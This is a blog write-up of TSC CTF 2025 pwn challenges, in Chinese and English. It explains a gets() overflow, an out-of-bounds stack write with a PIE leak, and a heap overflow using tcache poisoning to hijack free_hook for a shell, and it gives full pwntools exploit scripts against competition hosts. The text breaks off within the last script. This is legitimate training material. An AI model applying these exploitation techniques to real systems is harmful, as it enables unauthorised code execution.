<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<!--Description-->



    <meta name="description" content="TSC CTF 2025 - writeup
Author: 堇姬NaupRank: 5th

image
image
總排名第五名，解了26題，這場解的題目有點多，這邊只簡單寫一些有趣的題目，Pwn我應該會全寫
Ranked 5th overall, solving 26 challenges. "/>


<!--Author-->

    <meta name="author" content="Naup堇姬"/>


<!--Open Graph Title-->

    <meta property="og:title" content="TSC CTF 2025 - writeup"/>


<!--Open Graph Description-->

    <meta property="og:description" content="TSC CTF 2025 - writeup
Author: 堇姬NaupRank: 5th

image
image
總排名第五名，解了26題，這場解的題目有點多，這邊只簡單寫一些有趣的題目，Pwn我應該會全寫
Ranked 5th overall, solving 26 challenges. "/>


<!--Open Graph Site Name-->
    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>

<!--Type page-->

    <meta property="og:type" content="article"/>


<!--Page Cover-->


    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>


<meta name="twitter:card" content="summary_large_image"/>




    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>


<!-- Title -->

<title>TSC CTF 2025 - writeup | 堇姬 Naup&#39;s Blog</title>

<!-- Bootstrap Core CSS -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">

<!-- Custom CSS -->

<link rel="stylesheet" href="/css/main.css">


<!-- Custom Fonts -->
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<!-- Gallery -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">

<!-- favicon -->

<link rel="icon" href="/img/icon.jpg"/>



    <!-- Google Analytics -->
    


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
<!-- Head tag -->

<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
    <div class="container pl-0 pr-0">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
        </div>
        <div class="navbar-nav float-right">
            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
                <i class="fas fa-search"></i>
            </button>
        </div>
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 col-md-12 text-center">
                <div class="post-heading text-white">
                    <h1>TSC CTF 2025 - writeup</h1>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <!-- Post Main Content -->
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
                
                    <span class="meta d-inline-block">
    
    
    <!-- Date -->
    
        <span class="post-meta-split">&nbsp;|&nbsp;</span>
        <i class="far fa-calendar-check fa-fw"></i>
        2025-01-17
    
    <!-- word count and read count -->
    

    

    
</span>  
                
                <h1 id="TSC-CTF-2025-writeup"><a href="#TSC-CTF-2025-writeup" class="headerlink" title="TSC CTF 2025 - writeup"></a>TSC CTF 2025 - writeup</h1><blockquote>
<p>Author: 堇姬Naup<br>Rank: 5th</p>
</blockquote>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1dWOJLvye.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1dWOJLvye.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/By1xOJUwyx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/By1xOJUwyx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>總排名第五名，解了26題，這場解的題目有點多，這邊只簡單寫一些有趣的題目，Pwn我應該會全寫</p>
<p>Ranked 5th overall, solving 26 challenges. Since we solved quite a lot of challenges in this competition, I’ll only briefly write about some interesting ones here. But I should write all the Pwn challenges.</p>
<p>btw, this is my pwn template: <a target="_blank" rel="noopener" href="https://github.com/Naupjjin/MyCTFLib">https://github.com/Naupjjin/MyCTFLib</a></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="gamble-bad-bad"><a href="#gamble-bad-bad" class="headerlink" title="gamble_bad_bad"></a>gamble_bad_bad</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">GameState</span> &#123;</span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">20</span>];</span><br><span class="line">   <span class="type">char</span> jackpot_value[<span class="number">4</span>];  </span><br><span class="line">&#125; game;</span><br><span class="line"></span><br><span class="line"><span class="comment">// // // // //</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;輸入你的投注金額：&quot;</span>);</span><br><span class="line">   <span class="built_in">gets</span>(game.buffer);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>這裡在輸入時沒有控制輸入長度，導致可以蓋到 jackpot_value<br>只要蓋 jackpot_value 成 777 就可以 get flag</p>
<hr>
<p>There is no input length restriction here, allowing us to overwrite jackpot_value.<br>By simply overwriting jackpot_value to 777, we can get the flag.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(game.jackpot_value, <span class="string">&quot;777&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>My script</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;172.31.0.2&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;777&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="Localstack"><a href="#Localstack" class="headerlink" title="Localstack"></a>Localstack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="type">int64_t</span> <span class="built_in">stack</span>[MAX_STACK_SIZE];</span><br><span class="line">  <span class="type">int64_t</span> top = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;push&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(input, <span class="string">&quot;%*s %ld&quot;</span>, &amp;value) == <span class="number">1</span>) &#123;</span><br><span class="line">              <span class="built_in">stack</span>[++top] = value;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Pushed %ld to stack\n&quot;</span>, value);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Invalid push.\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;pop&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Popped %ld from stack\n&quot;</span>, <span class="built_in">stack</span>[top--]);</span><br></pre></td></tr></table></figure>

<p>漏洞點非常明顯，array 在 stack 上<br>pop 跟 push 沒有管控，導致可以控制top成很大或很小的數字來 oob，這題直接 oob 寫 ret address 就好了<br>另外show 可以用來 leakPIE 跳 print_flag<br>另外我這邊在蓋的時候，剛好可以蓋到 top，所以我直接把 top 改成可以推寫入到 save rbp，再往下寫入就可以了 (注意不要蓋到 stack canary)</p>
<hr>
<p>The vulnerability is very obvious: the array is located on the stack.<br>By using pop and push, we can manipulate top to a very large or very small number, leading to oob condition. In this challenge, directly using OOB to overwrite the return address is sufficient.</p>
<p>Additionally, show can be used to leak PIE and jump to print_flag.</p>
<p>When overwriting, I happened to be able to overwrite top, so I directly changed top to  the saved rbp. From there, I continued writing downward and write return address (making sure not to overwrite the stack canary).</p>
<hr>
<p>My script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.1.2 11100&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;pop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;show&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcvdata</span>():</span><br><span class="line">    rcu(<span class="string">&quot;Stack top: &quot;</span>)</span><br><span class="line">    leakdata = <span class="built_in">int</span>(rcl().strip())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LEAKDATA:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leakdata))</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">rcu(<span class="string">b&#x27;Stack top: &#x27;</span>)</span><br><span class="line">leakpie = <span class="built_in">int</span>(rcl().strip())</span><br><span class="line">piebase = leakpie - <span class="number">0x14ef</span></span><br><span class="line"></span><br><span class="line">target = piebase + <span class="number">0x1289</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;notice!!!&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    show()</span><br><span class="line">    rcvdata()</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;push &#x27;</span>+<span class="built_in">str</span>(<span class="number">29</span>).encode())</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;push &#x27;</span>+<span class="built_in">str</span>(target).encode())</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKPIE&quot;</span>,<span class="built_in">hex</span>(leakpie))</span><br><span class="line">NAUPINFO(<span class="string">&quot;PIEBASE&quot;</span>,<span class="built_in">hex</span>(piebase))</span><br><span class="line">NAUPINFO(<span class="string">&quot;TARGET&quot;</span>,<span class="built_in">hex</span>(target))</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="type">int</span> size = <span class="number">0</span>, idx = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;index &gt; &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">if</span> (!notes[idx])&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;invalid!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size &gt; &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;content &gt; &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>, notes[idx], size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit function 有 heap overflow 很明顯，通過 unsorted bin leak libc，malloc 兩塊，free掉下面那塊，heap overflow 蓋 tcache fd 到 free_hook，把 free_hook 改成 system，並將想要 Free 的 chunk 是 &#x2F;bin&#x2F;sh，就 get shell 了</p>
<p>PS: 記得要讓你在alloc free hook 的 fake chunk 時，tcache_pthread 的 cnt 要是 &gt; 0 的</p>
<hr>
<p>The edit function has a very obvious heap overflow. Using the unsorted bin, we can leak libc.<br>Allocate two chunks, then free the lower chunk.<br>Use heap overflow to overwrite the tcache fd to point to free_hook, then overwrite free_hook with system.<br>Finally, free a chunk containing &#x2F;bin&#x2F;sh to get a shell.</p>
<p>PS: Remember that when allocating the fake chunk for free_hook, the tcache_pthread count must be greater than 0.</p>
<hr>
<p>My script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 172.31.3.2 4241&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Heap IO</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index, size</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt; &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt; &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt; &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size,txt</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt; &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt; &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;content &gt; &#x27;</span>,txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt; &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### leaklibc</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x420</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x420</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leaklibc = u64(rcl()[:<span class="number">8</span>])</span><br><span class="line">libcbase = leaklibc - <span class="number">0x1ecbe0</span> </span><br><span class="line"></span><br><span class="line">libc_freehook = libcbase + <span class="number">0x1eee48</span></span><br><span class="line">libc_system = libcbase + <span class="number">0x52290</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### </span></span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(libc_freehook))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x100</span>,p64(libc_system))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span 